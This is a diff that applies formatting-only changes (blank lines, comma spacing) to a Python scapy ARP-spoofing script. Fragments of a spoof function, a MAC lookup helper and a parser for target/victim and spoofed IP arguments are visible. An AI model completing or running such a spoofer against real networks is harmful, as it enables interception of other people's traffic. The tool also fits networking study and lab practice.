@@ -4,6 +4,7 @@ import scapy.all as scapy
 import optparse
 from time import sleep
 
+
 def spoof(target_ip, spoof_ip, restore=False):
     spoof_mac = get_mac(spoof_ip)
     target_mac = get_mac(target_ip)
@@ -31,16 +32,18 @@ def get_mac(ip):
     result = scapy.srp(packet, timeout=10, iface='eth1', verbose=False)
     return result[0][0][1].hwsrc
 
+
 def parse_args():
     parser = optparse.OptionParser()
     parser.add_option("-t", "--target", dest="target", help="Target / Victim IP address")
     parser.add_option("-s", "--spoof", dest="spoof", help="Spoofed IP address")
-    opt,args = parser.parse_args()
+    opt, args = parser.parse_args()
     if not opt.target:
         parser.error("[-] Target IP wasn't specified, use --help for more information.")
     elif not opt.spoof:
         parser.error("[-] Spoofed IP wasn't specified, use --help for more information.")
     return opt
+
 
 opt = parse_args()
 try:
